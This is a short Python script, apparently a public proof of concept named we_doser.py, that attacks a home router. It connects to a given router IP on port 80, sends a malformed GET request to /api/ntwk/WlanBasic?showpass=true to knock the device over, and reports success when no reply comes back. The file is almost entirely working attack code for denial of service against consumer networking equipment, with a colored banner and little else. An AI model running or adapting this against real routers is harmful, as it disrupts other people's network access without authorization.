#!/usr/bin/env python3

import socket,sys,platform,os

colors = True  # Output should be colored
machine = sys.platform  # Detecting the os of current system
checkplatform = platform.platform() # Get current version of OS
if machine.lower().startswith(('os', 'win', 'darwin', 'ios')):
    colors = False  # Colors shouldn't be displayed in mac & windows
if checkplatform.startswith("Windows-10") and int(platform.version().split(".")[2]) >= 10586:
    colors = True
    os.system('')   # Enables the ANSI
if not colors:
    end = red = white = green = yellow = run = bad = good = bold = info = que = ''
else:
    white = '\033[97m'
    green = '\033[92m'
    red = '\033[91m'
    yellow = '\033[93m'
    end = '\033[0m'
    back = '\033[7;91m'
    bold = '\033[1m'
    blue = '\033[94m'
    info = '\033[93m[!]\033[0m'
    que = '\033[94m[?]\033[0m'
    bad = '\033[91m[-]\033[0m'
    good = '\033[92m[+]\033[0m'
    run = '\033[97m[~]\033[0m'
    grey = '\033[7;90m'
    cyan='\u001B[36m'
    gray = '\033[90m'
print(r'''
{red}{bold}
\ \    / /__   __| |___ ___ ___ _ _ 
 \ \/\/ / -_) / _` / _ (_-</ -_) '_|
  \_/\_/\___|_\__,_\___/__/\___|_|  
 /         |___|                  \
/                                  \
{yellow}# Coded by : Khaled Nassar @knassar702
{red}---------------------------------------
	'''.format(red=red,yellow=yellow,bold=bold))
if len(sys.argv) > 2:
	print('Usage : python3 we_doser.py ROUTER_IP')
	exit()
ip = sys.argv[1] # 192.168.1.1
s = socket.socket()
try:
	s.connect((ip,80))
except:
	print(f'{bad}{bold} Connection Error ..!')
	exit()
print(f'{good}{bold} Connected ')
print(f'{good}{bold} Sending the exploit')
s.send(b'GET /api/ntwk/WlanBasic?showpass=true HTTP/1.1')
try:
	if s.recv(61561561).decode('utf-8') != '':
		print(f'{bold}{bad} Secure .!')
		exit()
	else:
		print(f'{good}{bold} Done')
except :
	print(f'\n{bad}{bold} Stopped ..!' )
